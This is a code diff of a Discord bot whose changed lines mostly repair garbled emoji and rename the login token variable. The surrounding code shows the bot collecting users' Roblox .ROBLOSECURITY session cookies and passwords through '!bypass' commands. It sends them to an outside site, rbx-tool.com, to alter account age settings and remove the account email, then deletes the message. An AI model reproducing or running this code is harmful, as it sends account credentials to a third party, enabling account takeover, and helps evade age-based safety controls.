@@ -14,7 +14,7 @@ const client = new Client({
 });
 
 client.on('ready', () => {
-  console.log(`âœ… Logged in as ${client.user.tag}`);
+  console.log(`✅ Logged in as ${client.user.tag}`);
 });
 
 client.on('messageCreate', async (message) => {
@@ -24,13 +24,13 @@ client.on('messageCreate', async (message) => {
   const command = args.shift().toLowerCase();
 
   if (command === "!ping") {
-    message.reply("ðŸ“ Pong!");
+    message.reply("🏓 Pong!");
     return;
   }
 
   // !bypass2008 <cookie>
   if (command === "!bypass2008") {
-    if (!args[0]) return message.reply("âŒ Provide your .ROBLOSECURITY cookie");
+    if (!args[0]) return message.reply("❌ Provide your .ROBLOSECURITY cookie");
 
     const cookie = args[0];
     const url = `https://rbx-tool.com/apis/bypassAge?a=${encodeURIComponent(cookie)}`;
@@ -53,24 +53,24 @@ client.on('messageCreate', async (message) => {
 
       const embed = new EmbedBuilder()
         .setColor(data.status === "success" ? 0x22c55e : 0xef4444)
-        .setTitle(data.status === "success" ? "âœ… Success" : "âŒ Failed")
+        .setTitle(data.status === "success" ? "✅ Success" : "❌ Failed")
         .setDescription(data.message || (data.status === "success" ? "Success removing email!" : "Unknown error"));
 
       await message.reply({ embeds: [embed] });
     } catch (err) {
       const embed = new EmbedBuilder()
         .setColor(0xfacc15)
-        .setTitle("ðŸš« Request Failed")
+        .setTitle("🚫 Request Failed")
         .setDescription("Request blocked or failed to fetch data.");
       await message.reply({ embeds: [embed] });
     }
 
-    setTimeout(() => message.delete().catch(() => { }), 8000);
+    setTimeout(() => message.delete().catch(() => {}), 8000);
   }
 
   // !bypass13plus <cookie> <password>
   if (command === "!bypass13plus") {
-    if (!args[0] || !args[1]) return message.reply("âŒ Usage: `!bypass13plus <cookie> <password>`");
+    if (!args[0] || !args[1]) return message.reply("❌ Usage: `!bypass13plus <cookie> <password>`");
 
     const cookie = args[0];
     const password = args.slice(1).join(" ");
@@ -94,28 +94,29 @@ client.on('messageCreate', async (message) => {
 
       const embed = new EmbedBuilder()
         .setColor(data.status === "success" ? 0x22c55e : 0xef4444)
-        .setTitle(data.status === "success" ? "âœ… Success" : "âŒ Failed")
+        .setTitle(data.status === "success" ? "✅ Success" : "❌ Failed")
         .setDescription(data.message || (data.status === "success" ? "Success converting 13+ to under 13!" : "Unknown error"));
 
       await message.reply({ embeds: [embed] });
     } catch (err) {
       const embed = new EmbedBuilder()
         .setColor(0xfacc15)
-        .setTitle("ðŸš« Request Failed")
+        .setTitle("🚫 Request Failed")
         .setDescription("Request blocked or failed to fetch data.");
       await message.reply({ embeds: [embed] });
     }
 
-    setTimeout(() => message.delete().catch(() => { }), 8000);
+    setTimeout(() => message.delete().catch(() => {}), 8000);
   }
 
   if (command === "!help") {
     const embed = new EmbedBuilder()
       .setColor(0x60a5fa)
-      .setTitle("ðŸ“˜ Help Menu")
-      .setDescription("â€¢ `!bypass2008 <cookie>` â€“ Bypass with 2008 birth year\nâ€¢ `!bypass13plus <cookie> <password>` â€“ Bypass for 13+ accounts");
+      .setTitle("📘 Help Menu")
+      .setDescription("• `!bypass2008 <cookie>` – Bypass with 2008 birth year\n• `!bypass13plus <cookie> <password>` – Bypass for 13+ accounts");
     message.reply({ embeds: [embed] });
   }
 });
 
-client.login(process.env.DISCORD_TOKEN);
+// Login using Railway-provided secret
+client.login(process.env.BOT_TOKEN);
